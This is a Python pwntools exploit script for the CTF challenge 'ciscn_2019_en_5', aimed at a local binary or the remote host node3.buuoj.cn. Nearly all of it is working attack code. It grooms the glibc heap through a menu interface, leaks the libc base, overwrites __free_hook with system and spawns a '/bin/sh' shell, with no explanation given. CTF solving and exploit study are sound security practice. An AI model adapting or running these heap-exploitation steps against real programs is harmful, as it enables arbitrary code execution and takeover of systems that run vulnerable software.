import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_2019_en_5')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_2019_en_5')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',27454)
			elf=ELF('./ciscn_2019_en_5')
			libc=ELF('../../x64libc/libc.so.6')


		def name(a):
			io.sendlineafter('name> ',a)

		def add(a,b):
			io.sendlineafter('choice> ','1')
			io.sendlineafter('length> ',str(a))
			io.sendafter('content> ',b)

		def show(a):
			io.sendlineafter('choice> ','2')
			io.sendlineafter('index> ',str(a))

		def delete(a):
			io.sendlineafter('choice> ','3')
			io.sendlineafter('index> ',str(a))



		name('keer\n')
		add(0xf8,'keer\n') #0
		add(0xf8,'keer\n') #1
		add(0xf8,'keer\n') #2
		add(0xf8,'keer\n') #3
		add(0xf8,'keer\n') #4
		add(0xf8,'keer\n') #5
		for i in range(7):
			add(0xf8,'keer\n')

		for i in range(7):
			delete(6+i)

		delete(0)
		delete(1)
		delete(2)
		add(0xf0,'aaa\n')
		add(0x88,'1\n')
		add(0x38,'2\n') 
		add(0x98,'6\n')
		add(0x38,'7\n')
		for i in range(7):
			add(0x88,'keer\n')

		for i in range(7):
			delete(8+i)

		delete(1)
		delete(3)
		add(0xd8,'1\n')
		show(6)
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-8-0x10
		libc.address=libc_base
		add(0x18,'3\n')
		for i in range(8,20):
			add(0x110,'/bin/sh\x00')

		add(0x110,'/bin/sh;'+' '*0x18+p64(libc.sym['__free_hook']))

		io.sendlineafter('choice> ','4')
		io.sendlineafter('remarks> ',p64(libc.sym['system'])+'\n')







		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue